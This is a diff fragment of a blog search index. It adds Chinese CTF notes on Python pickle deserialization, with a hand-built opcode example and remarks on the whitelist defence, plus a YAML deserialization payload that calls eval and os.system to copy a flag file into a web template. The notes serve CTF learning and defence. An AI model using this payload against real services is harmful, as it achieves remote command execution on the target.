+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">User</span></span><br><span class="line"><span class="string">(S&#x27;qsdz&#x27;</span></span><br><span class="line"><span class="string">S&quot;114514&quot;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">a = pickle.loads(data)</span><br><span class="line"><span class="built_in">print</span>(a.name, a.age)</span><br></pre></td></tr></table></figure>
+<h3 id="其他">其他</h3>
+<p>为了解决pickle反序列化的问题，官方给出了使用改写
+<code>Unpickler.find_class()</code>
+方法，引入白名单的方式来解决，并且给出警告：对于允许反序列化的对象必须要保持警惕。对于开发者而言，如果实在要给用户反序列化的权限，最好使用双白名单限制
+<code>module</code> 和 <code>name</code>
+并充分考虑到白名单中的各模块和各函数是否有危险。</p>
+<p>由于 pickle
+“只能赋值，不能查值”的特性，唯一能够根据键值查询的操作就是
+<code>find_class</code> 函数，即 <code>c</code>、<code>i</code> 等
+opcode，如何根据特有的魔术方法、属性等找到突破口是关键；此外，在利用过程中，往往会借助
+<code>getattr</code>、<code>get</code>等函数。</p>
+<h3 id="yaml-反序列化">yaml 反序列化</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">!!python/<span class="built_in">object</span>/new:<span class="built_in">tuple</span></span><br><span class="line">- !!python/<span class="built_in">object</span>/new:<span class="built_in">map</span></span><br><span class="line">  - !!python/name:<span class="built_in">eval</span></span><br><span class="line">  - [ <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;cat /fllaagg_here &gt; templates/admin.html&#x27;</span>) ]</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>flask</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>nodejs相关攻击笔记</title>
+    <url>//nodejs-note.html</url>
+    <content><![CDATA[<h1 id="node.js">Node.js</h1>
+]]></content>
+      <tags>
+        <tag>nodejs</tag>
       </tags>
   </entry>
 </search>
